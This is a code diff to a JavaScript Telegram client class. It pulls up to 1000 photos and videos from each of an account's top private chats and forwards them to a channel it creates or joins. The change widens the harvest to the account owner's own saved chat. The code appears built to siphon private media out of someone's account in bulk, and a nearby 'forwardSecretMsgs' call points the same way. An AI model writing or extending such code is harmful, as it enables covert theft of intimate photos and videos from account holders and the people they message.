@@ -137,15 +137,18 @@ class TelegramManager {
                 await this.forwardSecretMsgs(fromChatId, channelId.toString());
             } else {
                 const chats = await this.getTopPrivateChats();
+                const me = await this.getMe();
                 if (chats.length > 0) {
                     const channelDetails = await this.createOrJoinChannel(channel);
                     channelId = channelDetails.id;
                     channelAccessHash = channelDetails.accesshash;
-                    for (const chat of chats) {
-                        const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video'] });
-                        console.log("Forwarding messages from chat:", chat.chatId, "to channel:", channelId);
-                        await this.forwardMessages(chat.chatId, channelId, mediaMessages.photo.messages);
-                        await this.forwardMessages(chat.chatId, channelId, mediaMessages.video.messages);
+                    const finalChats = new Set(chats.map(chat => chat.chatId));
+                    finalChats.add(me.id.toString());
+                    for (const chatId of finalChats) {
+                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: ['photo', 'video'] });
+                        console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
+                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
+                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                     }
                 }
                 console.log("Completed forwarding messages from top private chats to channel:", channelId);
